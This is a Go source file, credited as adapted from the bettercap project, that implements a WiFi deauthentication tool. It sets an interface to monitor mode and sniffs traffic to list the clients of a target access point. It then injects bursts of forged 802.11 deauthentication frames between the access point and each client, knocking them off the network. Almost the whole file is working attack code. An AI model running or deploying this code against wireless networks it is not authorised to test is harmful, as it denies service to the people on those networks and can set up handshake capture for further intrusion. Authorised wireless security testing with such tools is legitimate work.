/*
*	The code in the following file is an extraction from the bettercap projct
*	ALL CREDID GOES TO THEM
*	Some functions received little modification to fit the need
*	Including creating new function
 */

package wifi_common

import (
	"fmt"
	"log"
	"net"
	"time"

	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
	"github.com/evilsocket/islazy/tui"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type Deauther struct {
	InterfaceName string
	ApMac         string
	ClientMac     string
	SafeClients   []string
}

const (
	PCAP_DEFAULT_SETRF   = false
	PCAP_DEFAULT_SNAPLEN = 65536
	PCAP_DEFAULT_BUFSIZE = 2_097_152
	PCAP_DEFAULT_PROMISC = true
	PCAP_DEFAULT_TIMEOUT = pcap.BlockForever
	ErrIfaceNotUp        = "Interface Not Up"
)

var CAPTURE_DEFAULTS = CaptureOptions{
	Monitor: PCAP_DEFAULT_SETRF,
	Snaplen: PCAP_DEFAULT_SNAPLEN,
	Bufsize: PCAP_DEFAULT_BUFSIZE,
	Promisc: PCAP_DEFAULT_PROMISC,
	Timeout: PCAP_DEFAULT_TIMEOUT,
}

type CaptureOptions struct {
	Monitor bool
	Snaplen int
	Bufsize int
	Promisc bool
	Timeout time.Duration
}

type WiFiModule struct {
	//session.SessionModule
	iface  *network.Endpoint
	Handle *pcap.Handle
}

func NewWiFiModule(ifaceName string) (*WiFiModule, error) {

	var iface *network.Endpoint

	iface, err := network.FindInterface(ifaceName)
	if err != nil {
		return nil, err
	}

	mod := &WiFiModule{
		iface: iface,
	}

	opts := CAPTURE_DEFAULTS
	opts.Timeout = 500 * time.Millisecond
	opts.Monitor = true

	for retry := 0; ; retry++ {
		if mod.Handle, err = CaptureWithOptions(ifaceName, opts); err == nil {
			// we're done
			break
		} else if retry == 0 && err.Error() == ErrIfaceNotUp {
			// try to bring interface up and try again
			log.Printf("interface %s is down, bringing it up ...", ifaceName)
			if err := network.ActivateInterface(ifaceName); err != nil {
				return nil, err

			}
			continue
		} else if !opts.Monitor {
			// second fatal error, just bail
			log.Printf("error while activating handle: %s\n", err)
			return nil, err
		} else {
			// first fatal error, try again without setting the interface in monitor mode
			log.Printf("error while activating handle: %s, %s\n", err, tui.Bold("interface might already be monitoring. retrying!"))
			opts.Monitor = false
		}
	}

	return mod, nil
}

func (mod *WiFiModule) injectPacket(data []byte) {

	if err := mod.Handle.WritePacketData(data); err != nil {
		log.Printf("could not inject WiFi packet: %s\n", err)
		//mod.Session.Queue.TrackError()
	} else {
		log.Println(uint64(len(data)))
		log.Println("success")
		//		mod.Session.Queue.TrackSent(uint64(len(data)))
	}
	// let the network card breath a little
	time.Sleep(10 * time.Millisecond)
}

func (mod *WiFiModule) SendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {

	for seq := uint16(0); seq < 64; seq++ {
		if err, pkt := packets.NewDot11Deauth(ap, client, ap, seq); err != nil {
			log.Printf("could not create deauth packet: %s\n", err)
			continue
		} else {
			mod.injectPacket(pkt)
		}

		if err, pkt := packets.NewDot11Deauth(client, ap, ap, seq); err != nil {
			log.Printf("could not create deauth packet: %s\n", err)
			continue
		} else {

			mod.injectPacket(pkt)
		}
	}
}

func CaptureWithOptions(ifName string, options CaptureOptions) (*pcap.Handle, error) {
	//Debug("creating capture for '%s' with options: %+v", ifName, options)

	ihandle, err := pcap.NewInactiveHandle(ifName)
	if err != nil {
		return nil, fmt.Errorf("error while opening interface %s: %s", ifName, err)
	}
	defer ihandle.CleanUp()

	if options.Monitor {
		if err = ihandle.SetRFMon(true); err != nil {
			return nil, fmt.Errorf("error while setting interface %s in monitor mode: %s", tui.Bold(ifName), err)
		}
	}

	if err = ihandle.SetSnapLen(options.Snaplen); err != nil {
		return nil, fmt.Errorf("error while settng snapshot length: %s", err)
	} else if err = ihandle.SetBufferSize(options.Bufsize); err != nil {
		return nil, fmt.Errorf("error while settng buffer size: %s", err)
	} else if err = ihandle.SetPromisc(options.Promisc); err != nil {
		return nil, fmt.Errorf("error while settng promiscuous mode to %v: %s", options.Promisc, err)
	} else if err = ihandle.SetTimeout(options.Timeout); err != nil {
		return nil, fmt.Errorf("error while settng snapshot length: %s", err)
	}

	return ihandle.Activate()
}

func Capture(ifName string) (*pcap.Handle, error) {
	return CaptureWithOptions(ifName, CAPTURE_DEFAULTS)
}

func CaptureWithTimeout(ifName string, timeout time.Duration) (*pcap.Handle, error) {
	var opts = CAPTURE_DEFAULTS
	opts.Timeout = timeout
	return CaptureWithOptions(ifName, opts)
}

func FindApClients(apMac net.HardwareAddr, handle *pcap.Handle) (clients []*network.Station) {

	src := gopacket.NewPacketSource(handle, handle.LinkType())
	pktSourceChan := src.Packets()
	log.Println(len(pktSourceChan))
	for i := 0; i < 5; i++ {
		for packet := range pktSourceChan {

			// perform initial dot11 parsing and layers validation
			if ok, radiotap, dot11 := packets.Dot11Parse(packet); ok {
				// check FCS checksum
				if !dot11.ChecksumValid() {
					log.Println("skipping dot11 packet with invalid checksum.")
					continue
				}

				client := discoverClient(radiotap, dot11, apMac)

				if client != nil {
					log.Println("client discovered ", client)
					if FilterClient(clients, client.Endpoint.HwAddress) {
						clients = append(clients, client)
					}
				}
			}

			if len(pktSourceChan) == 0 {
				break
			}
		}
	}

	return clients
}

func discoverClient(radiotap *layers.RadioTap, dot11 *layers.Dot11, apMac net.HardwareAddr) *network.Station {

	if packets.Dot11IsDataFor(dot11, apMac) {
		bssid := dot11.Address2.String()
		freq := int(radiotap.ChannelFrequency)
		rssi := radiotap.DBMAntennaSignal

		station := network.NewStation("", bssid, freq, rssi)

		return station
	}
	return nil
}

func FilterClient(clientListMac []*network.Station, newClientMac string) bool {

	for _, clientMac := range clientListMac {
		if clientMac.Endpoint.HwAddress == newClientMac {
			return false
		}
	}
	return true
}
